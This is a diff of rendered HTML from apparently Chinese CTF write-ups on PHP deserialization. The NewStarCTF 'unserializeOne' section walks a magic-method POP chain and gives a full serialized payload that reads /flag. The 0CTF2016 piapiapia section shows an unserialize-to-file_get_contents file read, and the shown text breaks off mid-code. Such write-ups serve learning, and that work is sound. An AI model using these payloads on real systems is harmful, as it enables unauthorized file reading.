-</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="x">    {</span>
-</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
-</span><span id="__span-55-6"><a id="__codelineno-55-6" name="__codelineno-55-6" href="#__codelineno-55-6"></a><span class="x">            echo "success";</span>
-</span><span id="__span-55-7"><a id="__codelineno-55-7" name="__codelineno-55-7" href="#__codelineno-55-7"></a><span class="x">        }</span>
-</span><span id="__span-55-8"><a id="__codelineno-55-8" name="__codelineno-55-8" href="#__codelineno-55-8"></a><span class="x">    }</span>
-</span><span id="__span-55-9"><a id="__codelineno-55-9" name="__codelineno-55-9" href="#__codelineno-55-9"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="x">class eeee{</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="x">    public $obj;</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="x">    public function __clone()</span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="x">    {</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="x">            echo "success";</span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a><span class="x">        }</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a><span class="x">    }</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>isset($this-&gt;obj-&gt;cmd)</code> —— 如果 <code>$this-&gt;obj</code> 是个 <code>Start</code> 对象，而 <code>Start</code> 里没有 <code>cmd</code> 这个属性，</strong>这就是“对不存在的属性调用 isset”<strong>，正好触发 <code>Start::__isset</code>。</strong></p>
 <p><strong>所以 <code>eeee-&gt;obj</code> 要指向一个 <code>Start</code>，而那个 Start 的 <code>func</code> 要指向一个 <code>Sec</code>。</strong></p>
 <p><strong>下一个问题：<code>__clone</code> 怎么触发？</strong></p>
 <h4 id="step-4-clone"><a class="toclink" href="../../newstarctf-unserializeone/#step-4-clone">Step 4：谁在 clone 对象</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="x">class Easy{</span>
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="x">    public $cla;</span>
-</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a><span class="x">    public function __call($fun, $var)</span>
-</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="x">    {</span>
-</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
-</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a><span class="x">    }</span>
-</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="x">class Easy{</span>
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="x">    public $cla;</span>
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="x">    public function __call($fun, $var)</span>
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="x">    {</span>
+</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
+</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="x">    }</span>
+</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>clone $var[0]</code> —— 直接触发被 clone 对象的 <code>__clone</code>。</strong></p>
 <p><strong><code>__call</code> 的触发条件：</strong>调用了对象上不存在的方法<strong>。</strong></p>
 <h4 id="step-5"><a class="toclink" href="../../newstarctf-unserializeone/#step-5">Step 5：谁调用了不存在的方法</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="x">class Sec{</span>
-</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="x">    public function __toString()</span>
-</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="x">    {</span>
-</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
-</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="x">        return "CTFers";</span>
-</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="x">    }</span>
-</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">    public function __toString()</span>
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="x">    {</span>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="x">        return "CTFers";</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="x">    }</span>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong><code>$this-&gt;obj-&gt;check($this-&gt;var)</code> —— <code>check</code> 这个方法四个类里都没有，所以只要 <code>$this-&gt;obj</code> 是 <code>Easy</code>，就会触发 <code>Easy::__call</code>，</strong>而且第一个参数正好是 <code>$this-&gt;var</code><strong>（也就是我们要 clone 的那个 <code>eeee</code> 对象）。</strong></p>
 <p><strong><code>__toString</code> 的触发条件：</strong>对象被当成字符串使用<strong>。</strong></p>
 <h4 id="step-6"><a class="toclink" href="../../newstarctf-unserializeone/#step-6">Step 6：谁把对象当字符串用了</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="x">class Start{</span>
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="x">    public function __destruct()</span>
-</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="x">    {</span>
-</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
-</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="x">    }</span>
-</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="x">class Start{</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="x">    public function __destruct()</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="x">    {</span>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="x">    }</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>字符串拼接 <code>"..." . $this-&gt;name</code> —— 如果 <code>$this-&gt;name</code> 是个 <code>Sec</code> 对象，就会触发 <code>Sec::__toString</code>。</strong></p>
 <p><strong>而 <code>__destruct</code> 是</strong>对象被销毁时自动调用<strong>——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。</strong></p>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../newstarctf-unserializeone/#_3">完整链条</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>unserialize 结束、脚本运行完毕
-</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>  → Start::__destruct()            对象销毁自动触发
-</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>    → 字符串拼接 $this-&gt;name
-</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>      → Sec::__toString()          对象被当字符串用
-</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
-</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>          → Easy::__call()         不存在的方法被调用
-</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>            → clone $var[0]        克隆对象
-</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>              → eeee::__clone()    对象被 clone
-</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
-</span><span id="__span-59-10"><a id="__codelineno-59-10" name="__codelineno-59-10" href="#__codelineno-59-10"></a>                  → Start::__isset()       对不存在的属性 isset
-</span><span id="__span-59-11"><a id="__codelineno-59-11" name="__codelineno-59-11" href="#__codelineno-59-11"></a>                    → ($this-&gt;func)()      对象当函数调用
-</span><span id="__span-59-12"><a id="__codelineno-59-12" name="__codelineno-59-12" href="#__codelineno-59-12"></a>                      → Sec::__invoke()    对象当函数
-</span><span id="__span-59-13"><a id="__codelineno-59-13" name="__codelineno-59-13" href="#__codelineno-59-13"></a>                        → file_get_contents('/flag')
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>unserialize 结束、脚本运行完毕
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>  → Start::__destruct()            对象销毁自动触发
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>    → 字符串拼接 $this-&gt;name
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>      → Sec::__toString()          对象被当字符串用
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>          → Easy::__call()         不存在的方法被调用
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>            → clone $var[0]        克隆对象
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>              → eeee::__clone()    对象被 clone
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
+</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a>                  → Start::__isset()       对不存在的属性 isset
+</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>                    → ($this-&gt;func)()      对象当函数调用
+</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>                      → Sec::__invoke()    对象当函数
+</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a>                        → file_get_contents('/flag')
 </span></code></pre></div>
 <p><strong>五个魔术方法，一层扣一层，最后落在读文件上。</strong></p>
 <hr />
 <h3 id="payload"><a class="toclink" href="../../newstarctf-unserializeone/#payload">Payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>O:5:"Start":2:{
-</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a>  s:4:"name";O:3:"Sec":2:{
-</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
-</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>    s:3:"var";O:4:"eeee":1:{
-</span><span id="__span-60-5"><a id="__codelineno-60-5" name="__codelineno-60-5" href="#__codelineno-60-5"></a>      s:3:"obj";O:5:"Start":2:{
-</span><span id="__span-60-6"><a id="__codelineno-60-6" name="__codelineno-60-6" href="#__codelineno-60-6"></a>        s:4:"name";N;
-</span><span id="__span-60-7"><a id="__codelineno-60-7" name="__codelineno-60-7" href="#__codelineno-60-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
-</span><span id="__span-60-8"><a id="__codelineno-60-8" name="__codelineno-60-8" href="#__codelineno-60-8"></a>      }
-</span><span id="__span-60-9"><a id="__codelineno-60-9" name="__codelineno-60-9" href="#__codelineno-60-9"></a>    }
-</span><span id="__span-60-10"><a id="__codelineno-60-10" name="__codelineno-60-10" href="#__codelineno-60-10"></a>  }
-</span><span id="__span-60-11"><a id="__codelineno-60-11" name="__codelineno-60-11" href="#__codelineno-60-11"></a>  s:4:"func";N;
-</span><span id="__span-60-12"><a id="__codelineno-60-12" name="__codelineno-60-12" href="#__codelineno-60-12"></a>}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>O:5:"Start":2:{
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>  s:4:"name";O:3:"Sec":2:{
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>    s:3:"var";O:4:"eeee":1:{
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>      s:3:"obj";O:5:"Start":2:{
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>        s:4:"name";N;
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a>      }
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a>    }
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a>  }
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a>  s:4:"func";N;
+</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a>}
 </span></code></pre></div>
 <p><strong>压成一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
 </span></code></pre></div>
 <p><strong>POST 参数名 <code>pop</code>，值就是上面那串。</strong></p>
 <h4 id="payload_1"><a class="toclink" href="../../newstarctf-unserializeone/#payload_1">这个 payload 的结构对照</a></h4>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>外层 Start
-</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
-</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
-</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
-</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
-</span><span id="__span-62-6"><a id="__codelineno-62-6" name="__codelineno-62-6" href="#__codelineno-62-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
-</span><span id="__span-62-7"><a id="__codelineno-62-7" name="__codelineno-62-7" href="#__codelineno-62-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>外层 Start
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
+</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
+</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
 </span></code></pre></div>
 <hr />
 <h3 id="_4"><a class="toclink" href="../../newstarctf-unserializeone/#_4">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>从能读 flag 的地方倒推：
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>  file_get_contents  → Sec::__invoke
-</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
-</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
-</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
-</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
-</span><span id="__span-63-7"><a id="__codelineno-63-7" name="__codelineno-63-7" href="#__codelineno-63-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>从能读 flag 的地方倒推：
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>  file_get_contents  → Sec::__invoke
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
 </span></code></pre></div>
 <p><strong>每一步都在问同一个问题：</strong>要走到下一步，得先满足什么条件？<strong>——然后去别的类里找满足这个条件的地方。</strong></p>
 <h4 id="_5"><a class="toclink" href="../../newstarctf-unserializeone/#_5">漏洞原理</a></h4>
@@ -3968,9 +4159,9 @@
 <summary>属性可见性：protected / private 的写法不一样</summary>
 <p><strong>本题源码里四个类的属性在页面截图上都是 <code>public</code>，所以直接写属性名就行。</strong></p>
 <p><strong>但如果遇到 <code>protected</code> 或 <code>private</code>，序列化串里的名字要带前缀，而且</strong>长度要把前缀算进去<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>public     s:4:"name";          直接写名字
-</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
-</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>public     s:4:"name";          直接写名字
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
 </span></code></pre></div>
 <p><strong>本地构造时要按目标类的真实可见性来写</strong>，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。</p>
 </details>
@@ -4036,28 +4227,28 @@
 <p><strong>所以问题变成：从哪里能读到 <code>config.php</code>。</strong></p>
 <h4 id="step-3profilephp"><a class="toclink" href="../../0ctf2016-piapiapia/#step-3profilephp">Step 3：<code>profile.php</code> 里有个任意文件读取</a></h4>
 <p><img alt="profile.php" src="../../../assets/images/0ctf2016-piapiapia/01-profile-unserialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="x">$profile = unserialize($profile);</span>
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="x">$phone   = $profile['phone'];</span>
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="x">$email   = $profile['email'];</span>
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="x">$nickname = $profile['nickname'];</span>
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="x">$photo   = base64_encode(file_get_contents($profile['photo']));</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$profile = unserialize($profile);</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">$phone   = $profile['phone'];</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">$email   = $profile['email'];</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">$nickname = $profile['nickname'];</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="x">$photo   = base64_encode(file_get_contents($profile['photo']));</span>
 </span></code></pre></div>
 <p><strong>看到 <code>file_get_contents($profile['photo'])</code> 这一串，就想到：把 <code>photo</code> 换成 <code>config.php</code>，flag 不就出来了吗？</strong></p>
 <p><strong>但 <code>$profile</code> 是 <code>unserialize()</code> 出来的 —— 也就是说，<code>photo</code> 的值来自</strong>我们存在数据库里的那个序列化串<strong>，不是我们能直接改的。所以问题变成：怎么让数据库里那个串里的 <code>photo</code> 变成 <code>config.php</code>。</strong></p>
 <h4 id="step-4updatephp"><a class="toclink" href="../../0ctf2016-piapiapia/#step-4updatephp">Step 4：<code>update.php</code> 的三道校验</a></h4>
 <p><img alt="update.php 的校验" src="../../../assets/images/0ctf2016-piapiapia/02-update-validations.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">if(!preg_match('/^\d{11}$/', $_POST['phone']))</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="x">    die('Invalid phone');</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="x">if(!preg_match('/^[a-zA-Z0-9]{1,10}@[a-zA-Z0-9]{1,10}\.[a-zA-Z0-9]{1,10}$/', $_POST['email']))</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="x">    die('Invalid email');</span>
-</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
